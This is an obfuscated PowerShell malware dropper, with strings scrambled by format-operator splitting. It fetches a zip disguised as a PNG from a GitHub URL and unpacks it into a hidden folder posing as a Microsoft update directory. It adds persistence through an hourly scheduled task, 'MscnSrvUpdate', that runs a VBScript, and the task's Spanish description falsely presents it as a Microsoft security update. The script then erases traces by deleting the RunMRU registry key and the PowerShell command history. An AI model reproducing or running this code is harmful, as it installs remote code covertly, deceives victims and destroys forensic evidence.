${u`RL} = ("{9}{4}{8}{10}{7}{3}{1}{2}{0}{6}{5}" -f 'n/Msc','m','ai','ds/','ttps://gi','.png','n','ea','t','h','hub.com/emakedie/UCN/raw/refs/h')
${DestInAt`IoNf`OL`der} = "C:\Users\$env:USERNAME\AppData\Local\Microsoft\MsUpdate"
${ZIpF`i`Le} = &("{2}{0}{1}"-f 'in-P','ath','Jo') -Path ${deST`iNA`TIO`NFo`lDEr} -ChildPath ("{1}{0}"-f'zip','Mscn.')

if (-not (.("{0}{2}{1}" -f'Tes','Path','t-') -Path ${DEs`TiN`AtI`onFOLDER})) {
    .("{2}{1}{0}"-f 'em','ew-It','N') -ItemType ("{1}{0}"-f'y','Director') -Path ${de`stIN`AtIo`NFold`ER} -Force | .("{0}{1}{2}" -f 'O','ut-Nul','l')
    (.("{1}{0}{2}" -f'-I','Get','tem') ${deSt`I`NaTIOnfoLD`Er})."at`TR`IbUTes" = ("{1}{0}"-f 'dden','Hi')
}

&("{1}{4}{2}{0}{3}"-f'ebReque','Invok','W','st','e-') -Uri ${u`RL} -OutFile ${ziP`FIlE} -ErrorAction ("{0}{2}{1}"-f 'Silently','nue','Conti')


    .("{1}{3}{0}{2}{4}"-f'r','Expand-','ch','A','ive') -Path ${z`I`PfIlE} -DestinationPath ${DeS`T`IN`AtiONFOLD`eR} -Force -ErrorAction ("{0}{1}{2}{3}"-f'Sile','ntlyC','o','ntinue')

    &("{2}{3}{1}{0}"-f'em','t','Get-Child','I') -Path ${de`S`T`inAti`oNfol`DEr} -Recurse | .("{1}{3}{0}{2}" -f 'Obje','For','ct','Each-') {
        ${_}."AT`TriB`Utes" = ("{1}{0}" -f'dden','Hi')
    }

    &("{1}{0}{2}" -f '-It','Remove','em') -Path ${Z`IPF`iLE} -Force -ErrorAction ("{1}{3}{0}{4}{2}" -f 'y','Silen','e','tl','Continu')

.("{3}{2}{4}{0}{1}"-f'eduled','Task','gis','Unre','ter-Sch') -TaskName ("{1}{0}{2}"-f'c','Ms','nSrvUpdate') -Confirm:${fa`LSE} -ErrorAction ("{0}{2}{1}" -f'Silently','nue','Conti')

${ac`TIon} = &("{2}{4}{0}{3}{5}{6}{1}" -f 'd','ion','New','uledTas','-Sche','kAc','t') -Execute ("{0}{1}{2}" -f'w','script','.exe') -Argument "C:\Users\$env:USERNAME\AppData\Local\Microsoft\MsUpdate\Mscntask.vbs"
${tri`GGer} = &("{4}{1}{3}{0}{2}{5}" -f'ScheduledTaskTri','w','g','-','Ne','ger') -Once -At ("{2}{1}{0}" -f'M',':00A','00') -RepetitionInterval (.("{1}{3}{2}{0}"-f 'meSpan','Ne','-Ti','w') -Minutes 60) -RepetitionDuration (&("{2}{1}{0}"-f 'an','imeSp','New-T') -Days 365)
${seT`T`Ings} = .("{3}{2}{0}{1}{4}" -f 'hed','uledTaskSet','Sc','New-','tingsSet') -AllowStartIfOnBatteries -StartWhenAvailable
.("{5}{2}{0}{3}{4}{1}" -f 'Sched','k','ter-','ule','dTas','Regis') -Action ${AC`Ti`ON} -Trigger ${tR`IgGeR} -TaskName ("{1}{2}{0}"-f'pdate','MscnS','rvU') -Description ("{59}{41}{29}{34}{54}{39}{21}{2}{94}{45}{69}{16}{63}{28}{60}{31}{44}{50}{11}{5}{56}{36}{85}{58}{38}{84}{86}{55}{7}{81}{87}{24}{49}{35}{33}{74}{48}{47}{79}{64}{6}{18}{32}{51}{15}{10}{4}{30}{95}{80}{93}{72}{40}{77}{68}{82}{23}{90}{73}{12}{9}{52}{14}{17}{91}{71}{42}{8}{61}{27}{76}{97}{3}{75}{67}{70}{26}{20}{96}{92}{46}{65}{83}{66}{22}{19}{88}{1}{53}{0}{25}{43}{57}{62}{13}{37}{78}{89}"-f ' de Mi','war','de ','n. ','e',' ','no','s','icas no','puedan surgir ','rr','o','e ','la esté','o','co','i esta tar','si',' s',' so','ar','ware ','el','id','o se ac','cr','t','f','s','ne','gi',' de','e',',',' actu','á',', el ',' u','tware ','l soft','s','e','ríst','oso','shabilit','osoft.','ala','sign','o que ','tualizar','ada ',' podrán ','y es p','e','alizado e','cro','detenida','ft n','f','Manti','tá',' ','o ','ea e',' ','rá c','ndo ','st','u',' S','a ','ue las caracte','a','qu',' l','E','u',' v','san','ifica que',' ','o','lnerabil','ua','d','so','e Mi','ft n','ft','do.','ades ','ble q','se desinst','l','Micr','r','ea ','ncione') -Settings ${seTTI`N`Gs} | &("{1}{2}{0}"-f'll','Out','-Nu')

&("{3}{2}{1}{0}"-f 'k','heduledTas','art-Sc','St') -TaskName ("{0}{1}{2}"-f'MscnS','rvUpdat','e')


${RE`gI`St`Rypath} = ((("{2}{6}{8}{1}{4}{3}{11}{0}{9}{5}{7}{12}{10}" -f 'n','{','HKCU:{','{0}Cu','0}Windows','Ver','0}Software{0}Micr','sion{0','osoft','t','MRU','rre','}Explorer{0}Run'))-f [cHAR]92)
.("{0}{1}{3}{2}"-f'Remo','ve-It','m','e') -LiteralPath ${rEGistr`Yp`ATh} -Force -ErrorAction ("{3}{1}{0}{2}{4}" -f 'ntlyCont','ile','in','S','ue')

.("{2}{0}{3}{1}" -f 'r-','istory','Clea','H')
&("{0}{3}{2}{1}" -f 'Remov','tem','-I','e') (("{13}{14}{17}{15}{9}{21}{8}{19}{23}{20}{12}{4}{18}{0}{5}{1}{6}{2}{7}{3}{22}{10}{11}{16}" -f 'cnu','osoftcnu','nuPowerShe','eadlin','acnuRoamin','Micr','Windowsc','llcnuPSR','c','IL','cnuConso','leHost_hi','t','s7u','env:U','ROF','story.txt','SERP','g','nuAp','a','E','e','pD'))."rE`P`LACE"(([char]115+[char]55+[char]117),'$')."r`ePla`cE"('cnu',[STRiNg][char]92) -ErrorAction ("{1}{3}{4}{0}{2}"-f'nu','SilentlyCon','e','t','i')
exit
